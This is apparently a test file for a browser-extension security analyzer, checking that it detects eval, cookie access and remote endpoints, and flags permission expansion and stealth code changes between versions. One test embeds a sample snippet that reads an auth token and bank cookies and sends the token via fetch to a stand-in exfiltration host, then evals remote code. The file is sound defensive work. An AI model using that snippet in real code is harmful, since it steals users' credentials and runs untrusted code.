import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import { analyzeSinglePackage, comparePackages, scanCodeForPatterns } from '../src/core/packageAnalyzer.js';

const FIXTURES_DIR = path.resolve('test-fixtures');

test('scanCodeForPatterns detects eval, network endpoints, and cookie access', () => {
  const codeSnippet = `
    const token = localStorage.getItem('auth_token');
    chrome.cookies.get({ url: 'https://bank.com' });
    fetch("https://exfiltration-server-domain.com/collect?d=" + token);
    eval(remoteCodeString);
  `;

  const leads = scanCodeForPatterns(codeSnippet, 'test.js');

  assert.ok(leads.some(l => l.category === 'Dynamic Code Execution' && l.matched.includes('eval')));
  assert.ok(leads.some(l => l.category === 'Sensitive Data & Credential Access' && l.matched.includes('chrome.cookies')));
  assert.ok(leads.some(l => l.category === 'Remote Network Endpoint' && l.matched.includes('exfiltration-server-domain.com')));
});

test('analyzeSinglePackage reads synthetic benign extension zip accurately', async () => {
  const zipBytes = await fs.readFile(path.join(FIXTURES_DIR, 'benign-v1.zip'));
  const report = await analyzeSinglePackage(zipBytes, 'benign-v1.zip');

  assert.equal(report.manifestFound, true);
  assert.equal(report.extensionName, 'Quick Notes Utility');
  assert.equal(report.version, '1.0.0');
  assert.deepEqual(report.permissions, ['storage']);
  assert.equal(report.investigationLeads.length, 0); // Clean benign code
});

test('comparePackages flags suspicious permission expansion between v1 and v2', async () => {
  const [bytes1, bytes2] = await Promise.all([
    fs.readFile(path.join(FIXTURES_DIR, 'suspicious-expansion-v1.zip')),
    fs.readFile(path.join(FIXTURES_DIR, 'suspicious-expansion-v2.zip'))
  ]);

  const diffReport = await comparePackages(bytes1, bytes2, 'weather-v1.zip', 'weather-v2.zip');

  assert.equal(diffReport.overallSeverity, 'CRITICAL');
  assert.ok(diffReport.addedPermissions.includes('<all_urls>'));
  assert.ok(diffReport.addedPermissions.includes('cookies'));
  assert.ok(diffReport.addedPermissions.includes('webRequest'));
});

test('comparePackages flags stealth code modification without permission changes', async () => {
  const [bytes1, bytes2] = await Promise.all([
    fs.readFile(path.join(FIXTURES_DIR, 'stealth-code-v1.zip')),
    fs.readFile(path.join(FIXTURES_DIR, 'stealth-code-v2.zip'))
  ]);

  const diffReport = await comparePackages(bytes1, bytes2, 'stealth-v1.zip', 'stealth-v2.zip');

  // Permissions are identical:
  assert.deepEqual(diffReport.addedPermissions, []);
  // But new leads detected in worker.js!
  assert.ok(diffReport.newInvestigationLeads.length > 0);
  const evalLead = diffReport.newInvestigationLeads.find(l => l.category === 'Dynamic Code Execution');
  assert.ok(evalLead);
  assert.ok(evalLead.preview.includes('eval('));
  assert.ok(diffReport.newDiscoveredEndpoints.some(ep => ep.includes('telemetry-analytics-collector-gateway.com')));
});
